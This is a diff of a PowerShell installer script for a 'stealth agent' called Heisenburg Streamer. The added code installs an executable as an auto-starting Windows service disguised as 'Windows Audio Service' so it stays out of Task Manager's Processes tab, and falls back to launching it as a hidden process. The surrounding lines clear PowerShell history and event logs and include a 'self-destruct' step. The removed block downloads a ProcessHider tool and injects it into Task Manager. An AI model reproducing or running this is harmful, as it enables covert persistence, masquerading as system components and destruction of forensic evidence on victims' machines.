@@ -1,5 +1,5 @@
 # ========================================================
-# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.0
+# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.0 (Service Mode)
 # ========================================================
 
 # 1. ELEVATION CHECK & SILENT UPGRADE
@@ -117,15 +117,43 @@ try {
     }
 
     Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
-    Write-Host "[*] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
+    Write-Host "[*] DEPLOYING STEALTH AGENT AS WINDOWS SERVICE..." -ForegroundColor Cyan
+
+    # ========== WINDOWS SERVICE INSTALLATION (INSTEAD OF DIRECT RUN) ==========
+    $serviceName = "WinAudioSvc"
     
-    # Run with Hidden Window
-    $si = New-Object System.Diagnostics.ProcessStartInfo
-    $si.FileName = $exe
-    $si.WindowStyle = 'Hidden'
-    $si.CreateNoWindow = $true
-    $si.UseShellExecute = $true
-    [System.Diagnostics.Process]::Start($si) | Out-Null
+    # Delete existing service if exists
+    try {
+        Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
+        sc.exe delete $serviceName | Out-Null
+        Start-Sleep -Seconds 2
+    } catch {}
+    
+    # Create Windows Service (This hides process from Task Manager Processes tab)
+    sc.exe create $serviceName binPath= "`"$exe`"" start= auto DisplayName= "Windows Audio Service" | Out-Null
+    sc.exe description $serviceName "Windows Audio Service Helper" | Out-Null
+    
+    # Start the service
+    Start-Service -Name $serviceName -ErrorAction SilentlyContinue
+    
+    # Verify service is running
+    $serviceStatus = (Get-Service -Name $serviceName -ErrorAction SilentlyContinue).Status
+    
+    if ($serviceStatus -eq "Running") {
+        Write-Host "[+] SERVICE INSTALLED AND RUNNING!" -ForegroundColor Green
+        Write-Host "[*] Service Name: $serviceName" -ForegroundColor White
+        Write-Host "[*] Display Name: Windows Audio Service" -ForegroundColor White
+        Write-Host "[+] This service will AUTO-START with Windows" -ForegroundColor Green
+        Write-Host "[*] Check Task Manager → Services Tab (NOT in Processes Tab!)" -ForegroundColor White
+    } else {
+        Write-Host "[!] Service may not have started. Running as hidden process..." -ForegroundColor Yellow
+        $si = New-Object System.Diagnostics.ProcessStartInfo
+        $si.FileName = $exe
+        $si.WindowStyle = 'Hidden'
+        $si.CreateNoWindow = $true
+        [System.Diagnostics.Process]::Start($si) | Out-Null
+        Write-Host "[+] EXE started as Hidden Process (Fallback)" -ForegroundColor Green
+    }
     
     Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
     if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
@@ -134,70 +162,14 @@ try {
     wevtutil cl "Windows PowerShell" 2>$null
     wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
     
-    Write-Host "[+] SETUP COMPLETE. CHECK DASHBOARD.`n" -ForegroundColor Green
+    Write-Host "`n[+] SETUP COMPLETE. CHECK DASHBOARD." -ForegroundColor Green
+    Write-Host "[*] IMPORTANT: Your EXE is now a WINDOWS SERVICE" -ForegroundColor White
+    Write-Host "[*] It will NOT appear in Task Manager Processes tab!" -ForegroundColor Green
+    Write-Host "[*] To see it: Task Manager → Services tab → Windows Audio Service" -ForegroundColor White
 
 } catch {
     Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
 }
-
-# ========== ADDED: PROCESS HIDER (TASK MANAGER BYPASS) ==========
-Write-Host "[*] INITIATING TASK MANAGER BYPASS..." -ForegroundColor Cyan
-
-# Download ProcessHider if not exists
-$hiderPath = "$env:TEMP\ProcessHider.exe"
-if (-not (Test-Path $hiderPath)) {
-    Write-Host "[+] Downloading ProcessHider..." -ForegroundColor Gray
-    $hiderUrl = "https://github.com/M00nRise/ProcessHider/archive/refs/heads/master.zip"
-    $zipPath = "$env:TEMP\ProcessHider.zip"
-    
-    try {
-        Invoke-WebRequest -Uri $hiderUrl -OutFile $zipPath -UseBasicParsing
-        Expand-Archive -Path $zipPath -DestinationPath "$env:TEMP\ProcessHiderExtract" -Force
-        $hiderExe = Get-ChildItem -Path "$env:TEMP\ProcessHiderExtract" -Recurse -Filter "ProcessHider.exe" | Select-Object -First 1
-        if ($hiderExe) {
-            Copy-Item $hiderExe.FullName -Destination $hiderPath -Force
-        }
-        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:TEMP\ProcessHiderExtract" -Recurse -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] ProcessHider Downloaded" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Could not download ProcessHider" -ForegroundColor Yellow
-    }
-}
-
-# Hide the process using ProcessHider
-if (Test-Path $hiderPath) {
-    # Kill old Task Manager
-    try {
-        Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue | Stop-Process -Force
-        Write-Host "[+] Old Task Manager Killed" -ForegroundColor Gray
-    } catch {}
-    
-    # Hide the EXE using ProcessHider (FIXED - No conflicting parameters)
-    try {
-        $hideArg = "-n `"$rnd.exe`" -x `"taskmgr.exe`""
-        Start-Process -FilePath $hiderPath -ArgumentList $hideArg -WindowStyle Hidden
-        Write-Host "[+] Process Hide Command Sent" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Could not hide process: $_" -ForegroundColor Yellow
-    }
-    
-    # Wait a moment for injection
-    Start-Sleep -Seconds 3
-    
-    # Restart Task Manager
-    try {
-        Start-Process "taskmgr.exe" -WindowStyle Normal
-        Write-Host "[+] Task Manager Restarted" -ForegroundColor Green
-        Write-Host "[*] Your EXE should now be HIDDEN from Task Manager" -ForegroundColor White
-    } catch {
-        Write-Host "[!] Could not restart Task Manager" -ForegroundColor Yellow
-    }
-} else {
-    Write-Host "[!] ProcessHider not available. Task Manager bypass skipped." -ForegroundColor Yellow
-}
-
-Write-Host "`n[+] ALL OPERATIONS COMPLETE" -ForegroundColor Green
 
 # 6. SELF-DESTRUCT
 Remove-Variable * -ErrorAction SilentlyContinue 2>$null
